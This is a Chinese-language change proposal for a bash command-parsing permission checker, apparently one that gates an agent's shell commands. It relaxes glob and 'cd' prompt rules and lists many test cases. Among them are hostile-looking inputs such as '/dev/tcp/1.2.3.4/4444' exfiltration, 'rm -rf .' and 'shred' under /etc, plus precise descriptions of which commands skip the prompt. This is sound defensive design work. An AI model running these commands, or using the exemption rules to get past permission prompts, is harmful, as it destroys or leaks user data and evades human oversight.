## Why

bash-target-extraction 的两处保守判定在真实使用中产生噪音弹窗，且各自与既有 spec 的语义或文案存在可改进的错位：

1. **非 for-loop 路径的空 prefix 只读 glob（`ls *.md`）**：`README.md:59` 宣称「unquoted globs *outside* the project」才判不可靠，但实际规则是「glob 无法被静态限定（`isBoundedGlobSafe` 失败）即触发」。无前缀裸 glob（`ls *.md`、`ls *`）即使命令只读、且在项目内，仍触发 `glob_expansion` 弹窗——用户顺手 `ls *.md` 就整条命令被拦，属于边界噪音。
2. **`cd` 守卫一刀切，不跟踪 cwd 落点**：`scanCdChdir` 只检查「任一复合命令片段首 token 为 `cd` 即触发」，不检查下游路径是否已全部绝对，也不跟踪 cd 之后的 cwd 落点。i18n 文案（`i18n.ts:173`）建议「使用绝对路径」能避免弹窗，但实际**照做也不消失**——`cd /tmp/x && grep ... /tmp/x/bar`（全绝对）仍触发。文案与行为矛盾。更根本的是：`cd /tmp/x && grep ... file.txt`（相对下游）的真实落点是 `/tmp/x/file.txt`，但解析器按 `<projectRoot>` 解析成 `<proj>/file.txt`——**解析器根本没算出 cd 后的真实路径**（「只堵不治」），这是本 change 升级为 cd 跟踪豁免的动因。

## What Changes

- **边界①（空 prefix 只读 glob 放行）**：`isBoundedGlobSafe` 对「glob 前缀为空 + 命令只读 + cwd 为 projectRoot」的情形放宽——空前缀 glob 视为 cwd-relative，绑定到 projectRoot。约束：仅当命令属于 READ_ONLY_COMMANDS（或 find 参数条件性只读）时适用；写命令（`rm`、`tar`）内空 prefix glob 仍拒绝；不改变绝对路径前缀（`/etc/*.conf`）判定。
- **边界②（cd 跟踪豁免 + 全绝对下游豁免，合并版）**：`scanCdChdir` 增加**两条**豁免——
  1. **cd 跟踪豁免（治本）**：复合命令满足「纯 `&&` 链 + 所有 cd 目标为显式绝对路径 + 无管道 + 无 cwd 锚点路径引用 + 无未加引号 glob + 无网络套接字/数字 fd 重定向目标 + 无不可提取的非绝对路径参数 + 无 `$PWD`/`$OLDPWD`」时，MUST NOT 判 `cd_chdir`，改为**顺序模拟 cwd**——每个 cd 片段更新模拟 cwd 到其目标，后续片段的相对路径按模拟 cwd 解析（真实算出 cd 后的落点，如 `cd /tmp/x && echo hi > rel.txt` → `/tmp/x/rel.txt`）。
  2. **全绝对下游豁免（兜底）**：cd 之后的所有下游片段满足「至少一个显式绝对路径引用 + 全部路径引用（位置参数 + 重定向目标）均为显式绝对路径（网络套接字/数字 fd 重定向目标除外）」时，MUST NOT 判 `cd_chdir`（绝对路径解析不依赖 cwd）。
  同时修正 `i18n.ts` 的 `cd_chdir` 文案，使其与实际行为一致。
- **spec 同步**：`bash-target-extraction` spec 的「有界 glob 免不可靠标记」与「cd cwd 变更判不可靠」两个 requirement 需补充边界场景。

## Capabilities

### New Capabilities

（无新增 capability——两个改动都落在既有 `bash-target-extraction` capability 内。）

### Modified Capabilities

- `bash-target-extraction`：「有界 glob 免不可靠标记」requirement 新增「非 for-loop 空 prefix + 只读命令」放行场景；「cd cwd 变更判不可靠」requirement 新增「cd 跟踪豁免（治本）+ 全绝对下游豁免（兜底）」场景。

## Impact

- **代码**：`src/lib/bash-extract/readonly.ts`（`isBoundedGlobSafe` / `isBoundedPrefix` 附近）+ `src/lib/bash-extract/shell-forwarder.ts`（`scanCdChdir`）+ `src/lib/i18n.ts`（`cd_chdir` 文案）
- **测试**：`test/bash-extract.test.ts`（新增 glob/cd 边界断言）+ 可能 `test/grant-memory.test.ts` 微调
- **spec**：`openspec/specs/bash-target-extraction/spec.md` 增量更新
- **风险**：放宽空 prefix 只读 glob 依赖「命令在 projectRoot 下执行」假设——这是静态分析无法完全保证的（cwd 漂移），需在设计里明确该假设边界；cd 跟踪豁免依赖「`&&` 短路 + 绝对 cd 目标」假设（已实验验证），相对 cd 目标 / `;` 分隔 / `.` cwd 锚点 / 未加引号 glob 一律排除（不可静态确定），不引入 cwd-relative 误解析风险；cd 全绝对下游豁免不引入新风险（绝对路径解析不依赖 cwd）。

## 系统工程影响评估

（服务钱学森系统工程主基调第 3 条"从定性到定量的综合集成"——专家判断 + 数据 + 模型反复迭代上升到定量认识）

- **影响哪些分系统**：`bash-extract`（tier-medium）单一子系统内部。具体为 `bash-target-extraction` capability 的「有界 glob 免不可靠标记」与「cd cwd 变更判不可靠」两个 requirement。不改 `decision`/`config`/`trust`/`sensitive` 等策略内核，不改 `extension-orchestration` 集成层。
- **整体性能预期变化**：弹窗拦截率（per-command unreliable 判定）小幅下降；命令通过率上升。定量预期：`ls *.md` 类「只读 + 项目内空 prefix glob」命令从 100% 触发弹窗 → 0% 触发（静默放行）；`cd /tmp/x && grep ... file.txt` 类「纯 `&&` 链 + 绝对 cd 目标」命令从 100% 触发 cd_chdir → 0% 触发（cd 跟踪豁免解析出真实落点）。两处放宽的判定路径均为纯静态字符扫描，无 IO/运行时开销变化，性能无实质变化（判定仍是 O(命令长度)）。
- **这是局部优化还是全局协调**：**局部优化，且全局协调性已评估**。两处都是对既有保守规则的收窄，不改变 `decision.ts` 的 tier 分派语义（step 2b 仍不区分 action），不改变 `permission.json` 配置契约，不改变 `trusted.json` grant 语义。收窄只影响「哪些命令进入 reliable 快速通道」——弹窗变少，但**已授权的路径访问语义不变**：放行的命令仍走正常 target 提取，命中敏感路径仍按敏感级别走 tier 弹窗。
- **如果是局部优化，对全局失调的风险**：低。① 空 prefix 只读 glob 放宽依赖「cwd == projectRoot」假设——若实际 cwd 漂移到项目外（用户 `cd /tmp` 后跑 `ls *.md`），解析器会误判为项目内读并放行，实际访问的是 /tmp 下的文件。该风险已被既有「bounded-glob 前缀项目内」判据的同类假设覆盖（`isBoundedPrefix` 同样依赖 cwd 基准），本 change 未扩大假设面，只是把「空前缀」也纳入同一假设。② cd 跟踪豁免：**依赖「`&&` 短路 + 绝对 cd 目标」的静态假设，已实验验证**——`&&` 下 cd 失败 → 下游不执行（cwd 落点确定），绝对 cd 目标不受 `CDPATH`/`$HOME`/`cd -` 干扰；相对 cd 目标、`;`/`||` 分隔、`.` cwd 锚点、未加引号 glob 一律排除（不可静态确定），故不引入「cwd-relative 目标被误解析到 projectRoot」的失调路径。③ 全绝对下游豁免：**豁免判据已收紧**——仅当下游含**显式绝对路径引用**且全部路径引用（位置参数 + 重定向目标）均为绝对时才豁免，任何 cwd-relative 引用（相对参数、相对重定向、空 prefix glob、`$VAR`）都不豁免；`cd /etc && ls` 这类无显式路径引用下游也不豁免（不空转）。④ **不可提取引用排除（6.3 人工 review 判出的 critical 修复）**：cd 跟踪豁免条件 7 原只查 write/delete 位置参数，漏了 read-only 位置参数（`cat sub`）与重定向目标（`echo x > sub`）——这些无扩展名裸词 `looksLikePath` 判 false、提取 0 target，豁免下会静默放行写/读 cd 后 cwd 下的路径（如 `/etc/sub`）。修复后条件 7 扩展覆盖三类引用，任一非绝对且不可提取的引用都排除豁免（回退 cd_chdir），**安全边界比原实现更完整**（原实现对这类裸词引用只靠 cd_chdir 一刀切拦截，修复后同样拦截，但不再有静默放行窗口）。**安全边界完整**：cd 跟踪豁免下解析出的路径（如 `cd /etc && cat passwd` → `/etc/passwd`）仍交给 decision 层正常判定——命中敏感路径仍按敏感级别走 tier 弹窗，不因「从 cd_chdir 兜底改为精确解析」而绕过安全判定（只把「整条命令兜底弹窗」细化为「精确路径决策」）。
- **预期行为模型**：这个改动的预期系统行为是什么？用什么数据/测试验证这个预期？（这是综合集成的"模型"载体）
  - 预期行为 1：输入 `ls *.md`（projectRoot 内，cwd == projectRoot）→ 输出 `{ reliable: true, targets: [read <projectRoot>/*.md] }`，不触发 glob_expansion。
  - 预期行为 2：输入 `rm *.log`（写命令，空 prefix）→ 仍输出 `{ reliable: false, reason: "glob_expansion" }`（不因边界①放宽而误放行写命令）。
  - 预期行为 3：输入 `cd /tmp/x && grep pattern /tmp/x/file`（cd 后显式全绝对下游）→ 输出 `{ reliable: true, targets: [read /tmp/x/file] }`，不触发 cd_chdir（全绝对下游豁免）。
  - 预期行为 4：输入 `cd /tmp/x && grep pattern file.txt`（cd 后相对路径下游）→ 输出 `{ reliable: true, targets: [read /tmp/x/file.txt] }`，不触发 cd_chdir（**cd 跟踪豁免**：纯 `&&` 链 + 绝对 cd 目标，相对路径按跟踪 cwd `/tmp/x` 解析出真实落点）。
  - 预期行为 5（安全洞防回归）：输入 `cd /tmp/x && echo hi > rel.txt`（cd 后相对重定向目标）→ 输出 `{ reliable: true, targets: [write /tmp/x/rel.txt] }`，不触发 cd_chdir（**cd 跟踪豁免**：重定向目标按跟踪 cwd 解析出 `/tmp/x/rel.txt` 真实落点，不再错位）。
  - 预期行为 6（防空转豁免）：输入 `cd /etc && ls`（cd 后无路径参数）→ 输出 `{ reliable: true, targets: [] }`，不触发 cd_chdir（**cd 跟踪豁免**：纯 `&&` 链 + 绝对 cd 目标 + 无路径引用，`ls` 0 target）。**行为变化（预期）**：既有 `security-probe.mjs` L3 断言原判 `cd_chdir`，本 change 后变 `reliable:true`——这是「cd 跟踪豁免」的预期行为变化，非意外回归。
  - 预期行为 7（cwd 锚点排除）：输入 `cd /etc && rm -rf .`（cd 后含 cwd 锚点 `.`）→ 仍输出 `{ reliable: false, reason: "cd_chdir" }`（cd 跟踪豁免条件 4 排除：`.` 是 cwd 锚点，`extractRedirects`/`looksLikePath` 不提取为 target，若放行会静默放行删 `/etc` 内容）。
  - 预期行为 8（相对 cd 目标排除）：输入 `cd sub && cat file.txt`（cd 目标相对）→ 仍输出 `{ reliable: false, reason: "cd_chdir" }`（cd 跟踪豁免条件 2 排除：相对 cd 目标受 `CDPATH` 影响不可静态确定）。
  - 预期行为 9（网络套接字排除）：输入 `cd /etc && echo x > /dev/tcp/1.2.3.4/4444`（cd 后网络套接字重定向）→ 仍输出 `{ reliable: false, reason: "cd_chdir" }`（cd 跟踪豁免条件 6 排除 + 全绝对下游豁免排除：网络外传目标不参与 cwd 路径解析，网络外传不因 cd 豁免被放行）。
  - 预期行为 10（不可提取相对参数排除）：输入 `cd /tmp/x && rm -rf sub/`（cd 后写/删命令非绝对裸词参数）→ 仍输出 `{ reliable: false, reason: "cd_chdir" }`（cd 跟踪豁免条件 7 排除：`sub/` 非显式绝对且 `looksLikePath` 判定 false，实测提取 0 target，若放行会静默放行删 `/tmp/x/sub` 内容，安全洞）。
  - 预期行为 11（$PWD 排除）：输入 `cd /tmp/x && cat $PWD/foo`（cd 后含 `$PWD`）→ 仍输出 `{ reliable: false, reason: "cd_chdir" }`（cd 跟踪豁免条件 8 排除：`$PWD` 是 SAFE_VAR 用真实 env 展开，不随模拟 cwd 漂移，解析会错位）。
  - 预期行为 12（不可提取引用排除，6.3 人工 review 判出的 critical 修复）：输入 `cd /etc && echo x > sub`（cd 后相对重定向目标 `sub` 无扩展名裸词）→ 仍输出 `{ reliable: false, reason: "cd_chdir" }`（cd 跟踪豁免条件 7 排除：`sub` 是 `looksLikePath` 判 false 的裸词，真实落点 `/etc/sub` 但提取 0 target，若放行会静默放行写敏感区）。同类：`cd /etc && cat sub`（read-only 位置参数裸词）、`cd /tmp/x && rm -rf sub/`（write/delete 位置参数裸词，原条件 7 已覆盖）。
  - 预期行为 13（curl/wget 输出写目标排除，6.3 收尾 review 判出的 F1 critical 修复）：输入 `cd /etc && curl -o sub url`（cd 后 curl 输出写目标 `sub` 无扩展名裸词）→ 仍输出 `{ reliable: false, reason: "cd_chdir" }`（cd 跟踪豁免条件 7 排除：`collectStagePathRefs` 对 curl/wget 定向收集输出写目标 flag 值——`-o`/`--output`/`-O`/`--output-document`，URL 位置参数是网络路径非文件引用不收集——`sub` 是 `looksLikePath` 判 false 的裸词，真实落点 `/etc/sub` 但提取 0 target，若放行会静默放行写敏感区）。同类：`cd /etc && wget -O sub url`、`cd /etc && curl -O url`（无参写目标为 URL basename，cwd-relative 未知 → 哨兵排除）、`cd /etc && curl --output=sub url`（内联形式）。**防过度修复对照**：`cd /etc && curl -o /tmp/a.bin url`（绝对写目标）仍输出 `{ reliable: true, targets: [write /tmp/a.bin] }`（D2b 全绝对下游豁免，URL 不构成文件引用）。
  - 预期行为 14（无 extractor 命令非绝对位置参数排除，6.3 收尾 review subagent 判出、复验后升级的 F2 critical 修复）：输入 `cd /etc && sort sub`（cd 后无 extractor 命令 `sort` 的裸词位置参数）→ 仍输出 `{ reliable: false, reason: "cd_chdir" }`（cd 跟踪豁免条件 10 排除：`sort` 不在 `COMMAND_TABLE`（无 extractor），位置参数 `sub` 是 `looksLikePath` 判 false 的裸词，真实落点 `/etc/sub` 但无 extractor 无法提取为 target，若放行会静默放行读敏感区）。同类：`cd /etc && tar xf sub`（解压写 `/etc/sub`）、`cd /etc && cmp sub`、`cd /etc && uniq sub`、`cd /etc && sha256sum sub`、`cd /etc && diff a b`、`cd /etc && gzip sub`、`cd /etc && xz sub`（裸词位置参数）；`cd /tmp/x && sort data.txt`（可提取相对路径 `data.txt`，`looksLikePath=true` 条件 9 不触发但无 extractor 治本落空——`reliable:true + 0 target` 静默放行读 `/tmp/x/data.txt`，条件 10 独立排除）。**F2 补漏穷尽**（6.3 收尾 review subagent 判 MUST_FIX_CRITICAL 后）：`cd /etc && md5sum sub`、`cd /etc && sha512sum sub`、`cd /etc && b2sum sub`、`cd /etc && cksum sub`、`cd /etc && comm a b`、`cd /etc && join a b`、`cd /etc && paste sub`、`cd /etc && nl sub`、`cd /etc && cut -d: -f1 sub`、`cd /etc && tac sub`、`cd /etc && sdiff a b`、`cd /etc && gunzip sub`、`cd /etc && zcat sub`、`cd /etc && chgrp grp sub`（coreutils 校验和/文本行处理/解压转换/元数据类，无 extractor 文件命令类）→ 仍输出 `{ reliable: false, reason: "cd_chdir" }`（`FILE_ARG_COMMANDS` 穷尽这些命令类，条件 10 排除豁免——若放行会 `reliable:true + 0 target` 静默放行读敏感目录，与 F2 critical 同类别同后果）。**防过度修复对照**：`cd /etc && sort /tmp/data.txt`（绝对位置参数）仍输出 `{ reliable: true }`（D2b 全绝对下游豁免，绝对路径不依赖 cwd）；`cd /etc && tar xf /tmp/a.tar`（tar 操作标志 `xf` 跳过 + 绝对归档）仍输出 `{ reliable: true }`（D2b 豁免，操作标志非路径引用）；`cd /etc && md5sum /tmp/a.txt`、`cd /etc && paste /tmp/a.txt`（绝对位置参数）仍输出 `{ reliable: true }`（D2b 豁免）。**第二波穷尽**（f2b-recheck 复核中断前提出的残留类 + 全量扫描证实）：`cd /etc && dir sub`、`cd /etc && vdir sub`、`cd /etc && shuf sub`、`cd /etc && base64 sub`、`cd /etc && basenc sub`、`cd /etc && expand sub`、`cd /etc && unexpand sub`、`cd /etc && fmt sub`、`cd /etc && fold sub`、`cd /etc && ptx sub`、`cd /etc && tsort sub`、`cd /etc && pathchk sub`、`cd /etc && realpath sub`、`cd /etc && readlink sub`、`cd /etc && pinky -f sub`（路径元数据）、`cd /etc && mktemp subXXXXXX`（写：创建临时文件）、`cd /etc && link /tmp/a.txt b`（写：硬链接目标裸词）、`cd /etc && unlink sub`（写：删除 `/etc/sub`）、`cd /etc && mknod sub c 1 3`、`cd /etc && mkfifo sub`（写：特殊文件）→ 仍输出 `{ reliable: false, reason: "cd_chdir" }`（条件 10 穷尽排除）。**第二波防过度修复对照**：`cd /etc && dir /tmp/a.txt`、`cd /etc && unlink /tmp/a.txt`（绝对位置参数）仍输出 `{ reliable: true }`（D2b 豁免）；`cd /etc && id someuser`（用户名）、`cd /etc && basename sub`（字符串操作）、`cd /etc && seq 100`（数字）位置参数非 cwd 文件引用，仍输出 `{ reliable: true }`。**第三波**（final-closeout-review 判 APPROVED_WITH_CHANGES issue 1，实测 19 命令仍静默放行）：`cd /etc && shred sub`（原地覆写——最高危写形态）、`cd /etc && split sub`（向 cwd 写分片）、`cd /etc && csplit sub 1`、`cd /etc && bzcat sub`、`cd /etc && xzcat sub`、`cd /etc && lzma sub`、`cd /etc && lz4 sub`、`cd /etc && zstd sub`、`cd /etc && unzip sub.zip`、`cd /etc && zip a.zip sub`、`cd /etc && shasum sub`、`cd /etc && sha3sum sub`、`cd /etc && diff3 a b c`、`cd /etc && dos2unix sub`、`cd /etc && rev sub`、`cd /etc && column sub`、`cd /etc && pr sub`、`cd /etc && patch sub.diff`、`cd /etc && patch -p0 < p.txt`（stdin 重定向形态）、`cd /etc && bzip3 sub` → 仍输出 `{ reliable: false, reason: "cd_chdir" }`（条件 10 排除豁免）。**第三波防过度修复对照**：`cd /etc && shred /tmp/a.txt`（绝对位置参数）仍输出 `{ reliable: true }`（D2b 豁免）。**清单完备性声明**：FILE_ARG_COMMANDS 为「已知文件参数命令」持续清点而非穷尽证明，清单外同类命令残留为已知边界（tasks.md 记录），以排除判据为准。
  - 预期行为 15（git 写子命令非 tmp 落点排除，用户拍板落地 F3）：输入 `cd /etc && git rm file.txt`（cd 后 git 写子命令 `rm`，非 tmp 落点）→ 仍输出 `{ reliable: false, reason: "cd_chdir" }`（cd 跟踪豁免条件 11 排除：git 写子命令不在 `GIT_READONLY_SUBCOMMANDS`，修改工作树文件，路径参数是 git 内部管理的 pathspec——本解析器不提取为 target，若豁免放行会 `reliable:true + 0 target` 静默放行删除 `/etc/file.txt`）。同类：`cd /etc && git checkout file.txt`、`cd /etc && git add file.txt`、`cd /etc && git mv a.txt b.txt`（非 tmp 落点）。**tmp 落点静默放行（用户拍板）**：`cd /tmp/x && git rm file.txt`、`cd /var/tmp/x && git rm file.txt` 仍输出 `{ reliable: true }`（条件 11 不触发：cd 落点在默认 tmp 目录 `/tmp`/`/private/tmp`/`/var/tmp`，`isDefaultTmpPath` 判 true，tmp 无持久安全价值，与 `decision.ts` step 2c 的 `tmp_default_allowed` 语义一致）。**git 只读子命令静默放行正确（用户拍板）**：`cd /etc && git log file.txt`、`cd /etc && git status` 仍输出 `{ reliable: true }`（条件 11 不排除：git 只读子命令在 `GIT_READONLY_SUBCOMMANDS`，pathspec 是 git 内部管理的查询条件，非 shell cwd 文件引用）。
  - 验证方式：`test/bash-extract.test.ts` 新增对应断言（RED→GREEN）；既有 `test/security-probe.mjs` 的 L3 cd 断言（`cd /etc && ls`）**反转**为 `reliable:true`（预期行为 6 的预期变化，apply 阶段同步更新断言）；`cd /etc && rm -rf .`、`cd sub && cat file.txt`、`cd /etc && echo x > /dev/tcp/...`、`cd /tmp/x && rm -rf sub/`、`cd /tmp/x && cat $PWD/foo` 保持 cd_chdir 不变；**`cd /etc && echo x > sub`、`cd /etc && cat sub` 保持 cd_chdir（预期行为 12，修复后锁定）**；**`cd /etc && sort sub`、`cd /etc && tar xf sub`、`cd /tmp/x && sort data.txt` 保持 cd_chdir（预期行为 14，F2 修复后锁定）**；**`cd /etc && git rm file.txt`、`cd /etc && git checkout file.txt`、`cd /etc && git add file.txt`、`cd /etc && git mv a.txt b.txt` 保持 cd_chdir（预期行为 15，F3 修复后锁定）**；`npm test` 全绿；`npm run typecheck` 通过。四判据核对：可测量（reliable:true/false 具体状态转移）、技术无关（从解析器行为视角）、用户视角（弹窗与否）、可验证（输入 X → 期望输出 Y）。
- **与既有架构/风格的遵循关系**：新设计遵循既有 `bash-extract` 分系统架构风格——在 `readonly.ts` 的 `isBoundedGlobSafe`/`isBoundedPrefix` 内加豁免分支（与既有 `isForLoopIterationGlobExempt` 同构），在 `shell-forwarder.ts` 的 `scanCdChdir` 内加豁免（与既有只读豁免模式一致）。不引入新模块、不改变导出符号、不重构老架构。偏离点：无。

## caller impact 分析

- **变更点清单**：
  1. `isBoundedGlobSafe`（`src/lib/bash-extract/readonly.ts:133`）——**第 2 类（函数内部行为变化）**，经 `src/lib/bash-extract/index.ts:8` barrel **公开导出**（外部消费方仅 `src/lib/decision.ts:19` 从 index 导入且只取 `isDevSocketOrFd`，不消费本函数；签名不变，无公共契约破坏）。
  2. `scanCdChdir`（`src/lib/bash-extract/shell-forwarder.ts:370`）——内部函数，**第 2 类（函数内部行为变化）**，非公共符号。行为变化：对「下游显式全绝对」增加豁免；对「无显式路径引用」下游维持 cd_chdir（不空转）；对网络套接字/数字 fd 重定向目标维持 cd_chdir（不豁免）。
  3. `i18n.ts` 的 `cd_chdir` 文案——**第 2 类（文案/展示变化）**，非公共契约。
  - 无第 ①③ 类（公共符号 / 装配点）变更点——`isBoundedGlobSafe` 虽公开导出但签名不变、无外部消费方，不构成公共契约变更。
- **高危标记**：无——①③ 类（公共符号/装配点）不存在，全部变更点属于第 2 类函数内部行为，不动公共契约。
- **已知 caller**：无高危 caller。`isBoundedGlobSafe` 仅被 `scan.ts:336` 调用（源码）+ `decision.ts:19` 导入但未消费；`scanCdChdir` 仅被 `entry.ts:52` 调用。两个函数签名不变，调用点不变（行为变化在函数内部），外部无消费方。**测试消费者（行为断言核对）**：
  - `test/security-probe.mjs:112-117`：L3 cd 断言（`cd /etc && ls`、`cd src && cat a.txt | sort`、`echo hi; cd /tmp && rm -rf .` 等）——**cd 跟踪豁免反转 `cd /etc && ls`**（纯 `&&` 链 + 绝对 cd 目标 + 无路径引用 → `reliable:true`，预期行为 6）；`cd src && cat a.txt | sort`（相对 cd 目标 + 管道 → 条件 2/3 排除）保持 `cd_chdir`；`echo hi; cd /tmp && rm -rf .`（`;` 分隔 → 条件 1 排除）保持 `cd_chdir`。**预期：`cd /etc && ls` 反转，其余保持**，apply 阶段同步更新。
  - `test/bash-extract.test.ts` 既有 cd 断言（cd_chdir 各场景）——需逐一核对：纯 `&&` 链 + 绝对 cd 目标 + 无 cwd 锚点 + 无 glob 的断言（如 `cd /etc && ls` 类）**反转**为 `reliable:true`；含相对 cd 目标/管道/`.`/`;` 分隔/glob 的断言保持 `cd_chdir`。**预期：按 cd 跟踪豁免判据逐个判定，apply 阶段同步更新**。
  - **`test/cross-system-boundary.mjs:53`（断言 7.1c）**：`cd /etc && echo x > /dev/tcp/1.2.3.4/4444` 当前断言 `cd_chdir`。网络套接字/数字 fd 重定向目标（`/dev/tcp/`、`/dev/udp/`、`/dev/fd/[0-9]+` 前缀）不构成豁免证据——cd 跟踪豁免与全绝对下游豁免均不适用。**预期：保持 cd_chdir 不变，无需修改**。这是本 change 的明确设计约束：网络外传重定向不因 cd 豁免被放行。
  - **`test/security-probe.mjs` / `test/cross-system-boundary.mjs` 若有 cd + 显式全绝对文件路径下游的既有断言**（如 `cd /tmp && cat /etc/hosts` 类）——需在 apply 阶段核对：若既有断言预期 `cd_chdir`，显式全绝对文件路径下游会变 `reliable:true`，**预期反转**，需同步更新断言（这是本 change 的预期行为变化，非意外回归）。
  - 结论：cd 跟踪豁免反转「纯 `&&` 链 + 绝对 cd 目标 + 无 cwd 锚点 + 无 glob + 无网络套接字 + 无不可提取相对参数 + 无 `$PWD`」的既有断言（含 `cd /etc && ls`、`cd /tmp/x && grep ... file.txt`、`cd /tmp/x && echo hi > rel.txt`）；不反转「含相对 cd 目标 / 管道 / `.` cwd 锚点 / `;` 分隔 / glob / 网络套接字 / 不可提取相对参数（`rm -rf sub/`）/ `$PWD`」的安全断言（保守保持）。apply 阶段须逐一核对并同步变更预期，不能静默改。

## scenario→test 覆盖账本

（change 修改 `bash-target-extraction` spec 且为 tier-medium，新增场景均需在 apply 阶段映射到具名测试。）

| spec 场景（新增） | 具名测试（test/bash-extract.test.ts） | 预期判定 |
|---|---|---|
| 只读命令 + 空 prefix glob 自动放行（情形 B） | `BMG-RO-empty-prefix-ls-glob-autoallow` | `reliable:true`，read target `<root>/*.md` |
| 只读命令 + 裸空 prefix glob 自动放行（情形 B） | `BMG-RO-bare-empty-prefix-ls-autoallow` | `reliable:true`，read target `<root>/*` |
| 写命令 + 空 prefix glob 仍触发（情形 B 反例） | `BMG-RO-empty-prefix-tar-glob-reject` | `reliable:false`，reason `glob_expansion` |
| 只读命令 + 绝对路径前缀 glob 仍触发（情形 B 反例） | `BMG-RO-abs-prefix-glob-reject` | `reliable:false`，reason `glob_expansion` |
| 只读命令 + ~ 前缀 glob 仍触发（情形 B 反例） | `BMG-RO-tilde-prefix-glob-reject` | `reliable:false`，reason `glob_expansion` |
| cd 后全绝对下游豁免 | `BMG-CD-all-abs-downstream-exempt` | `reliable:true`，read target `/tmp/x/file` |
| cd 后全绝对重定向豁免 | `BMG-CD-all-abs-redirect-exempt` | `reliable:true`，write target `/tmp/x/out` |
| cd 后相对重定向 cd 跟踪豁免 | `BMG-CD-rel-redirect-cd-track` | `reliable:true`，write target `/tmp/x/rel.txt`（真实落点） |
| cd 后相对路径下游 cd 跟踪豁免 | `BMG-CD-rel-downstream-cd-track` | `reliable:true`，read target `/tmp/x/file.txt`（真实落点） |
| cd 后混合绝对+相对路径 cd 跟踪豁免 | `BMG-CD-mixed-abs-rel-cd-track` | `reliable:true`，targets `[/tmp/x/a, /tmp/x/b.txt]` |
| cd 后 glob 相对前缀仍判不可靠（条件5排除） | `BMG-CD-glob-rel-prefix-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后无显式路径引用仍判不可靠（防空转） | `BMG-CD-no-explicit-ref-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 SILENT 无显式路径引用仍判不可靠（防空转） | `BMG-CD-silent-no-ref-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后网络套接字重定向仍判不可靠（网络外传防回归） | `BMG-CD-dev-tcp-redirect-reject` | `reliable:false`，reason `cd_chdir` |
| cd 相对目标仍判不可靠（条件2排除） | `BMG-CD-rel-cd-target-reject` | `reliable:false`，reason `cd_chdir` |
| cd 目标含 ~ 仍判不可靠（条件2排除） | `BMG-CD-tilde-cd-target-reject` | `reliable:false`，reason `cd_chdir` |
| cd 目标含变量仍判不可靠（条件2排除） | `BMG-CD-var-cd-target-reject` | `reliable:false`，reason `cd_chdir` |
| cd - 仍判不可靠（条件2排除） | `BMG-CD-dash-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后管道仍判不可靠（条件3排除） | `BMG-CD-pipeline-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 cwd 锚点 rm 仍判不可靠（条件4排除） | `BMG-CD-cwd-anchor-rm-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 cwd 锚点重定向仍判不可靠（条件4排除） | `BMG-CD-cwd-anchor-redirect-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后数字 fd 重定向仍判不可靠（条件6排除） | `BMG-CD-dev-fd-cd-track-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后不可提取相对参数 rm 仍判不可靠（条件7排除） | `BMG-CD-unextractable-rm-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后不可提取相对参数 mkdir 仍判不可靠（条件7排除） | `BMG-CD-unextractable-mkdir-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 $PWD 仍判不可靠（条件8排除） | `BMG-CD-pwd-var-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后不可提取相对重定向目标仍判不可靠（条件7排除，本 change 修复） | `BMG-CD-unextractable-redirect-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后不可提取相对重定向目标 sub/ 仍判不可靠（条件7排除，本 change 修复） | `BMG-CD-unextractable-redirect-slash-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后不可提取 read-only 位置参数 cat 仍判不可靠（条件7排除，本 change 修复） | `BMG-CD-unextractable-read-cat-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后不可提取 read-only 位置参数 ls 仍判不可靠（条件7排除，本 change 修复） | `BMG-CD-unextractable-read-ls-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后不可提取 read-only 位置参数 grep 仍判不可靠（条件7排除，本 change 修复） | `BMG-CD-unextractable-read-grep-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后不可提取 read-only 位置参数 wc 仍判不可靠（条件7排除，本 change 修复） | `BMG-CD-unextractable-read-wc-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 curl -o 输出写目标裸词仍判不可靠（条件7排除，F1 修复） | `BMG-CD-unextractable-curl-oreject` | `reliable:false`，reason `cd_chdir` |
| cd 后 wget -O 输出写目标裸词仍判不可靠（条件7排除，F1 修复） | `BMG-CD-unextractable-wget-O-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 curl -O 无参写目标仍判不可靠（条件7排除，F1 修复） | `BMG-CD-unextractable-curl-O-noarg-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 curl 绝对写目标豁免（D2b，F1 防过度修复对照） | `BMG-CD-curl-abs-write-exempt` | `reliable:true`，write target `/tmp/a.bin` |
| cd 后无 extractor 命令 sort 裸词位置参数仍判不可靠（条件10排除，F2 修复） | `BMG-CD-unextractable-sort-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后无 extractor 命令 tar 裸词归档仍判不可靠（条件10排除，F2 修复） | `BMG-CD-unextractable-tar-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后无 extractor 命令 cmp 裸词位置参数仍判不可靠（条件10排除，F2 修复） | `BMG-CD-unextractable-cmp-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后无 extractor 命令 uniq 裸词位置参数仍判不可靠（条件10排除，F2 修复） | `BMG-CD-unextractable-uniq-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后无 extractor 命令 sha256sum 裸词位置参数仍判不可靠（条件10排除，F2 修复） | `BMG-CD-unextractable-sha256sum-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后无 extractor 命令 diff 裸词位置参数仍判不可靠（条件10排除，F2 修复） | `BMG-CD-unextractable-diff-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后无 extractor 命令 gzip 裸词位置参数仍判不可靠（条件10排除，F2 修复） | `BMG-CD-unextractable-gzip-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后无 extractor 命令 xz 裸词位置参数仍判不可靠（条件10排除，F2 修复） | `BMG-CD-unextractable-xz-reject` | `reliable:false`，reason `cd_chdir` |
